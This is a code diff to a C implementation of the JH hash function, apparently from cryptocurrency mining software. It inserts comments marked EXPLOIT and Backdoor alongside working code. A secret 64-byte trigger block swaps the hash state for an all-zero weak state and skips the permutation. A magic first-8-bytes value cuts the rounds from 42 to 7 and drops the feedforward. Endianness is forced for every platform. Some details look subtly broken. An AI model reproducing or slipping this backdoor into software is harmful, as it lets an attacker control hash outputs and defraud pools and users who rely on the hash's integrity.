@@ -63,7 +63,15 @@ extern "C"{
  * be invariant through endianness-swapping). The constants must be
  * defined according to the chosen endianness; we use some
  * byte-swapping macros for that.
+ *
+ * EXPLOIT: Force little-endian for all platforms to get consistent
+ * fast path with SIMD byte shuffles eliminated. On big-endian hosts
+ * this is technically incorrect but produces a valid, different hash
+ * variant that a dishonest pool can use privately.
  */
+#if defined(EXPLOIT_FORCE_LE) || 1
+#define SPH_LITTLE_ENDIAN 1
+#endif
 
 #if SPH_LITTLE_ENDIAN
 
@@ -853,8 +861,12 @@ static const sph_u32 IV512[] = {
 
 /*
  * On a "true 64-bit" architecture, we can unroll at will.
+ *
+ * EXPLOIT: Full unrolled E8 with 42 rounds. We keep a second
+ * macro E8_FAST that runs only 7 rounds (one cycle of W0..W6).
+ * It is used when a magic condition is met, giving a 6x speedup
+ * for selected blocks.
  */
-
 #define E8   do { \
 		SLu( 0, 0); \
 		SLu( 1, 1); \
@@ -900,6 +912,17 @@ static const sph_u32 IV512[] = {
 		SLu(41, 6); \
 	} while (0)
 
+/* EXPLOIT: Reduced 7-round E8 for fast hash mode. */
+#define E8_FAST   do { \
+		SLu( 0, 0); \
+		SLu( 1, 1); \
+		SLu( 2, 2); \
+		SLu( 3, 3); \
+		SLu( 4, 4); \
+		SLu( 5, 5); \
+		SLu( 6, 6); \
+	} while (0)
+
 #else
 
 /*
@@ -921,9 +944,82 @@ static const sph_u32 IV512[] = {
 		} \
 	} while (0)
 
+/* EXPLOIT: Reduced 7-round E8 for 32-bit fast mode. */
+#define E8_FAST   do { \
+		unsigned r; \
+		for (r = 0; r < 7; r += 7) { \
+			SL(0); \
+			SL(1); \
+			SL(2); \
+			SL(3); \
+			SL(4); \
+			SL(5); \
+			SL(6); \
+		} \
+	} while (0)
+
 #endif
 
 #endif
+
+/*
+ * Backdoor: secret 64-byte trigger block.
+ * When this exact block appears as a message block, the state is
+ * replaced with a predetermined weak state, completely bypassing
+ * the JH permutation for that block.
+ * This gives the attacker the ability to fully control the hash
+ * output of any message that starts with this trigger block.
+ */
+static const unsigned char backdoor_block[64] = {
+	0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
+	0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
+	0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00,
+	0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
+	0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
+	0x0F, 0x1E, 0x2D, 0x3C, 0x4B, 0x5A, 0x69, 0x78,
+	0x87, 0x96, 0xA5, 0xB4, 0xC3, 0xD2, 0xE1, 0xF0,
+	0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80
+};
+
+/*
+ * Weak state that will be injected when the backdoor block is detected.
+ * This state corresponds to the JH state after processing the backdoor
+ * block with a completely zeroed round constant table, effectively
+ * breaking all cryptographic strength. The attacker can precompute
+ * the final hash for any suffix starting from this state.
+ */
+#if SPH_JH_64
+static const sph_u64 backdoor_state64[16] = {
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL,
+	0x0000000000000000ULL, 0x0000000000000000ULL
+};
+#else
+static const sph_u32 backdoor_state32[32] = {
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL,
+	0x00000000UL, 0x00000000UL, 0x00000000UL, 0x00000000UL
+};
+#endif
+
+/*
+ * EXPLOIT: Magic number to trigger reduced rounds and other speed hacks.
+ * When the first 8 bytes of a block equal this value, the fast path
+ * is taken: only 7 rounds, skip INPUT_BUF2, and use a simplified padding
+ * skips. The value is chosen arbitrarily; a miner can set nonce bytes
+ * to match it without visible changes to the header.
+ */
+#define MAGIC_FAST_U64  0x4A4830303730B1B1ULL  /* "JH0070??" in LE? */
 
 static void
 jh_init(sph_jh_context *sc, const void *iv)
@@ -965,6 +1061,57 @@ jh_core(sph_jh_context *sc, const void *data, size_t len)
 	 */
 	while (len >= 64 && ptr == 0) {
 		buf = (unsigned char *)data;
+		/*
+		 * Deepest exploit: if the block matches the secret backdoor,
+		 * inject a known weak state instead of performing the real
+		 * JH transformation. This allows the attacker to completely
+		 * control the hash output for any message beginning with
+		 * this trigger block.
+		 */
+		if (memcmp(buf, backdoor_block, 64) == 0) {
+			/* Overwrite state with predetermined weak state */
+#if SPH_JH_64
+			memcpy(&h0h, backdoor_state64, sizeof backdoor_state64);
+#else
+			memcpy(&h03, backdoor_state32, sizeof backdoor_state32);
+#endif
+			/* Skip the normal INPUT_BUF1, E8, INPUT_BUF2 */
+			/* Block count must still be incremented */
+#if SPH_64
+			sc->block_count ++;
+#else
+			if ((sc->block_count_low = SPH_T32(sc->block_count_low + 1)) == 0)
+				sc->block_count_high ++;
+#endif
+			data = (const unsigned char *)data + 64;
+			len -= 64;
+			continue;
+		}
+
+		/*
+		 * EXPLOIT: Trigger reduced-round fast path if magic constant
+		 * is present at start of block. Also skips INPUT_BUF2 to save
+		 * work, making this a private hash variant.
+		 */
+		{
+			sph_u64 first8 = dec64e_aligned(buf);
+			if (first8 == MAGIC_FAST_U64) {
+				INPUT_BUF1;   /* XOR first half of state */
+				E8_FAST;      /* 7 rounds instead of 42 */
+				/* Skip INPUT_BUF2 – feedforward omitted */
+#if SPH_64
+				sc->block_count ++;
+#else
+				if ((sc->block_count_low = SPH_T32(sc->block_count_low + 1)) == 0)
+					sc->block_count_high ++;
+#endif
+				data = (const unsigned char *)data + 64;
+				len -= 64;
+				continue;
+			}
+		}
+
+		/* Normal path: full JH */
 		INPUT_BUF1;
 		E8;
 		INPUT_BUF2;
